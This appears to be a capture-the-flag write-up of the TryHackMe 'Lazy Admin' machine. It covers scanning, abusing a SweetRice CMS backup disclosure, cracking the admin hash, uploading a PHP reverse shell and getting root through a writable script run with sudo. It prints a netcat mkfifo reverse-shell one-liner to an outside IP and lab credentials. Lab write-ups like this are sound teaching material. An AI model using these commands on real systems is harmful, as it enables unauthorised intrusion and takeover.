---
title: Lazy Admin
date: 2022-05-27 17:00:00 +500
categories: [THM, easy machines]
tags: []    # TAG names should always be lowercase
---

10.10.74.238

### What is the user flag?

Let's run a quick Nmap scan
```terminal
nmap -p- -sS --min-rate 10000 --open -vvv -n -Pn 10.10.74.238
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

going to the page is the default apache webpage, nothing much to see, so let's run a gobuster scan to see if we find any hidden directory.

Im going to use the '-x' flag which adds the extension to the words in the wordlist, but doesn't replace the original words withouth the extension, so naturally it makes the scan slower since it got more words to try, I usually get lucky with only php but if not, you can try with .txt, .pdf, etc. or even .html .htm since some wordlists don't have this extensions by defautl.

```terminal
gobuster dir -u http://10.10.74.238/ -w /usr/share/dirb/wordlists/common.txt -x .php
```

```
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.74.238/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
```

we found an directory '/content', heading over the page we see that is a page after the installation of SweetRice which looks like is a CMS like wordpress.

I'll do another gobuster scan in the background while I search for exploits for this software.

with searchsploit we can search exploits from the terminal, exploits that we have on our computer.
```terminal
searchsploit sweetrice
```

and there are a few
```
SweetRice 0.5.3 - Remote File Inclusion                         | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                      | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                       | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                         | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                             | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                    | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Executi | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload           | php/webapps/14184.txt
```

but we don't know whats version is it, so we'd be just trying and see if we're lucky. Im going to try enum the webpage if I found something.

going throung the source code, it looks like I found a version, in /content/js/SweetRice.js there is this comment at the start of the code:
```
/**
 * SweetRice javascript function.
 *
 * @package SweetRice
 * @Dashboard core
 * @since 0.5.4
 */
<!--
```

if im not mistaken and that's the version, it's a pretty old one.
the gobuster scan also finished

```
/as                   (Status: 301) [Size: 317] [--> http://10.10.74.238/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.74.238/content/attachment/]
/images               (Status: 301) [Size: 321] [--> http://10.10.74.238/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.74.238/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [Size: 317] [--> http://10.10.74.238/content/js/]
```

*as is a login page

we have the folder attachment that may be the folder were files are uploaded, and we have the "SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload " exploit so i think thats our chance.

after taking a more close look, this doesn't work for us because it uses a plugin 'FCKeditor' which it's not installed here, we can check it going to 'http://10.10.74.238/content/_plugin/'.

then i tried the two exploits above, that didn't worked for me also, then I tried the 'Backup Disclosure' which says that there a directory with a mysql backup, I downloaded looking for credentials or something, and I think I found a user and a password:

'''
\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
'''

looks like manager is the admin and his password is that hash, so i use hash-identifier to see what kind of hash is a it's looks like is MD5, now with this let's use hashcat to crack it up.

with the normal mode it did not cracked it, so i'll use the rockyou wordlists.

* -m 0 is the mode for MD5 raw
* -a 0 is to use a wordlist

```terminal
hashcat -m 0 -a 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
```

and it does crack it to 'Password123', now with this credentials we can access the login page under /content/as. 

my initial thought in the admin panel was upload a revershell, to somewhere or execute it somehow. I first started creating a post and putting the raw code from a php reverseshell and then execute it, but it did't work (also you have to mark the website status as running to see the posts you create), then i tried to upload the shell to the section that said upload files a bit exceptical because i thought of this only going to display the file to download it, but it actually runs it when you click it, so I got a shell!

the php shell: https://raw.githubusercontent.com/jivoi/pentest/master/shell/rshell.php
(change the IP to yours and the port you'd like)
(remeber to have a listener with the reverseshell file port when executing the shell)

under the itguy's home directory is our first flag

> 

### What is the root flag?

Let's do some enumeration on the machine, we have mysql_login.txt with some credentials

```
rice:randompass
```

we have permissions to execute a file in itguy's home directory

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

backup.pl
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

let's see what's copy.sh
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.26.231 5554 >/tmp/f
```

it's a bash reverseshell, let's check if we have permissions to write on it

```terminal
ls -la /etc/copy.sh
```

and we have '-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh'
in the third group of permissions 'rwx' all other users can write on it.

so let's change the IP for ours, but nano isn't working, so i'll do it with echo

```terminal
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.26.231 5554 >/tmp/f" > /etc/copy.sh
```

and now we execute it with sudo, so we'll have a root shell (remember have the listener ready with the correct port, this case 5554)

in your local machine:
```terminal
nc -lvnp 5554
```

in the victims machine:
```terminal
sudo /usr/bin/perl /home/itguy/backup.pl
```

And we got ourselves a root shell! now just go and cat the flag under /root

> 
